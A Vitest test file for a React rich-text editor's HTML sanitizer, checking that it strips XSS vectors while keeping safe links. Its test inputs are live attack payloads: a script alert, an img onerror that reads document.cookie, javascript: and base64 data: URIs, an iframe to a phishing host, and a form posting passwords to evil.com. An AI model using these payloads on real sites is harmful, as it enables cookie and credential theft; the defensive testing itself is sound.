import { describe, it, expect } from "vitest"
import { sanitizeRichText, ZainXRichTextEditor } from "../components/ZainXRichTextEditor/ZainXRichTextEditor"
import { render, screen } from "@testing-library/react"
import React from "react"

describe("ZainXRichTextEditor Security & Sanitization Contract Suite", () => {
  describe("DOMPurify Deep Attack Vector Neutralization", () => {
    it("strips active <script> injection payloads", () => {
      const payload = '<p>Normal text</p><script>alert("XSS")</script>'
      const result = sanitizeRichText(payload)
      expect(result).not.toContain("<script>")
      expect(result).not.toContain("alert")
      expect(result).toContain("<p>Normal text</p>")
    })

    it("strips onerror event handlers on <img> and media tags", () => {
      const payload = '<p>Photo</p><img src="invalid-image.jpg" onerror="alert(document.cookie)" />'
      const result = sanitizeRichText(payload)
      expect(result).not.toContain("onerror")
      expect(result).not.toContain("alert")
    })

    it("neutralizes dangerous javascript: pseudo-protocol URIs in anchors", () => {
      const payload = '<p><a href="javascript:alert(1)">Malicious Link</a></p>'
      const result = sanitizeRichText(payload)
      expect(result).not.toContain("javascript:")
    })

    it("neutralizes data: URI HTML payloads in links", () => {
      const payload = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data Attack</a>'
      const result = sanitizeRichText(payload)
      expect(result).not.toContain("data:text/html")
    })

    it("strips embedded <iframe>, <object>, and <embed> tags", () => {
      const payload = '<div><iframe src="https://evil-phishing.com"></iframe><object data="malware.swf"></object></div>'
      const result = sanitizeRichText(payload)
      expect(result).not.toContain("<iframe")
      expect(result).not.toContain("<object")
    })

    it("strips inline form injections and password input fields", () => {
      const payload = '<form action="https://evil.com/steal"><input type="password" name="pwd" /></form>'
      const result = sanitizeRichText(payload)
      expect(result).not.toContain("<form")
      expect(result).not.toContain("<input")
    })

    it("enforces rel='noopener noreferrer nofollow' and target='_blank' on safe external links", () => {
      const safePayload = '<p>Visit <a href="https://workforce.zain.com">Workforce Portal</a></p>'
      const result = sanitizeRichText(safePayload)
      expect(result).toContain('href="https://workforce.zain.com"')
      expect(result).toContain('rel="noopener noreferrer nofollow"')
      expect(result).toContain('target="_blank"')
    })
  })

  describe("Structured ProseMirror JSON Contract", () => {
    it("renders structured JSON document cleanly without XSS risks", async () => {
      const jsonContent: ZainXRichTextJSON = {
        type: "doc",
        content: [
          {
            type: "heading",
            attrs: { level: 2 },
            content: [{ type: "text", text: "Security Engineering Lead" }],
          },
          {
            type: "paragraph",
            content: [
              { type: "text", text: "Responsible for " },
              { type: "text", marks: [{ type: "bold" }], text: "zero trust" },
              { type: "text", text: " architecture." },
            ],
          },
        ],
      }

      render(<ZainXRichTextEditor jsonValue={jsonContent} />)
      expect(await screen.findByText("Security Engineering Lead")).toBeDefined()
      expect(await screen.findByText("zero trust")).toBeDefined()
    })
  })
})
